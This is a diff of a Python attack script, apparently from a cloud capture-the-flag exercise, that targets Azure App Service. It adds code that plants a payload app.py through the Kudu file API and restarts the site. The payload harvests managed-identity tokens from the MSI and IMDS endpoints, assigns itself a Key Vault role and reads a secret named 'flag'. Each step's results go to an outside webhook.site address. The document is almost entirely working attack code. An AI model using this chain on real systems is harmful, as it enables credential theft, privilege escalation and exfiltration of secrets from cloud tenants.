@@ -109,6 +109,15 @@ def kudu_get(path, timeout=15):
     except Exception as e:
         return {"status":"error", "error":repr(e)}
 
+def kudu_put(path, data, timeout=20):
+    try:
+        u = "https://" + APP + ".scm.azurewebsites.net" + path
+        req = urllib.request.Request(u, data=data, method="PUT", headers={"Authorization":"Basic "+auth, "Content-Type":"text/plain"})
+        r = urllib.request.urlopen(req, timeout=timeout)
+        return {"status":r.status, "body":r.read().decode("utf-8","replace")[:3000]}
+    except Exception as e:
+        return {"status":"error", "error":repr(e)}
+
 try:
     for path in ("/api/settings", "/api/environment", "/api/processes", "/api/diagnostics"):
         outer_emit({"stage":"kudu-" + path.strip("/").replace("/","-"), "response":kudu_get(path)})
@@ -126,6 +135,95 @@ try:
         outer_emit({"stage":"sp-site-config", "path":suffix, "response":arm_call(arm, site_base + suffix)})
 except Exception as e:
     outer_emit({"stage":"sp-site-config-error", "error":repr(e)})
+
+# Kudu and the Python worker are separate containers.  Place a tiny app module
+# in the shared wwwroot and restart the site so it executes with the App
+# Service managed-identity sidecar, which is unavailable from SCM.
+app_payload = r'''import os, json, time, uuid, base64, urllib.parse, urllib.request, urllib.error, traceback
+HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
+SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
+MIRES = "/subscriptions/" + SUB + "/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
+MICLIENT = "7a85156a-01c4-4e61-8472-40a92107159b"
+MIPRINCIPAL = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
+KV2SCOPE = "subscriptions/" + SUB + "/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
+def emit(x):
+    try:
+        urllib.request.urlopen(urllib.request.Request(HOOK, data=json.dumps(x, default=str).encode(), method="POST", headers={"Content-Type":"application/json"}), timeout=6).read()
+    except Exception:
+        pass
+def token(resource):
+    env = os.environ
+    eps = []
+    for ep in (env.get("IDENTITY_ENDPOINT"), env.get("MSI_ENDPOINT"), "http://127.0.0.1:8081/msi/token", "http://169.254.131.3:8081/msi/token", "http://169.254.130.3:8081/msi/token"):
+        if ep and ep not in eps: eps.append(ep)
+    hdr = {}
+    if env.get("IDENTITY_HEADER"): hdr["X-IDENTITY-HEADER"] = env["IDENTITY_HEADER"]
+    if env.get("MSI_SECRET"): hdr["Secret"] = env["MSI_SECRET"]
+    errs=[]
+    for ep in eps:
+        for extra in ("&client_id="+urllib.parse.quote(MICLIENT), "&mi_res_id="+urllib.parse.quote(MIRES, safe=""), ""):
+            u = ep + "?resource=" + urllib.parse.quote(resource, safe="") + "&api-version=2019-08-01" + extra
+            try:
+                d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers=hdr), timeout=5).read().decode())
+                if d.get("access_token"):
+                    emit({"stage":"app-identity-token","resource":resource,"endpoint":ep,"env_endpoint":env.get("IDENTITY_ENDPOINT"),"has_header":bool(env.get("IDENTITY_HEADER"))})
+                    return d["access_token"]
+                errs.append(str(d)[:180])
+            except Exception as e: errs.append(repr(e))
+    for u in ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource="+urllib.parse.quote(resource, safe="")+"&client_id="+MICLIENT,):
+        try:
+            d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers={"Metadata":"true"}), timeout=5).read().decode())
+            if d.get("access_token"): return d["access_token"]
+        except Exception as e: errs.append(repr(e))
+    raise RuntimeError("app identity failed: " + " | ".join(errs[-8:]))
+def arm_put(url, body, tok):
+    try:
+        r=urllib.request.urlopen(urllib.request.Request(url, data=json.dumps(body).encode(), method="PUT", headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}), timeout=25)
+        return {"status":r.status,"body":r.read().decode("utf-8","replace")[:2000]}
+    except urllib.error.HTTPError as e:
+        return {"status":e.code,"body":e.read().decode("utf-8","replace")[:3000]}
+    except Exception as e: return {"error":repr(e)}
+def read_flag(tok):
+    u="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
+    try:
+        r=urllib.request.urlopen(urllib.request.Request(u, headers={"Authorization":"Bearer "+tok}), timeout=20)
+        return {"status":r.status,"body":r.read().decode("utf-8","replace")[:12000]}
+    except urllib.error.HTTPError as e: return {"status":e.code,"body":e.read().decode("utf-8","replace")[:3000]}
+    except Exception as e: return {"error":repr(e)}
+def run():
+    emit({"stage":"app-container-start","env_keys":[k for k in os.environ if "IDENTITY" in k or k.startswith("MSI") or k.startswith("WEBSITE")][:80],"identity_endpoint":os.environ.get("IDENTITY_ENDPOINT")})
+    try:
+        at=token("https://management.azure.com")
+        ra= "https://management.azure.com/"+KV2SCOPE+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"
+        body={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":MIPRINCIPAL,"principalType":"ServicePrincipal"}}
+        emit({"stage":"app-role-assignment","response":arm_put(ra,body,at)})
+        last=None
+        for i in range(20):
+            try:
+                res=read_flag(token("https://vault.azure.net"))
+                emit({"stage":"app-flag","attempt":i+1,"response":res})
+                if res.get("status")==200: return
+                last=res
+            except Exception as e: last=repr(e)
+            time.sleep(4)
+        emit({"stage":"app-flag-error","last":last})
+    except Exception as e: emit({"stage":"app-error","error":repr(e),"trace":traceback.format_exc()})
+try:
+    run()
+except Exception as e: emit({"stage":"app-top-error","error":repr(e)})
+from flask import Flask, jsonify
+app=Flask(__name__)
+@app.route("/", defaults={"path":""})
+@app.route("/<path:path>")
+def catch(path): return jsonify(status="ok", path=path)
+'''
+outer_emit({"stage":"app-write", "response":kudu_put("/api/vfs/site/wwwroot/app.py", app_payload.encode())})
+try:
+    rr = urllib.request.urlopen(urllib.request.Request(restart_url, data=b"", method="POST", headers={"Authorization":"Bearer "+arm}), timeout=30)
+    outer_emit({"stage":"app-restart-after-write", "status":rr.status})
+except Exception as e:
+    outer_emit({"stage":"app-restart-after-write", "error":repr(e)})
+time.sleep(15)
 
 def shared_headers(account, key, verb, container, blob=None, query=None):
     now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
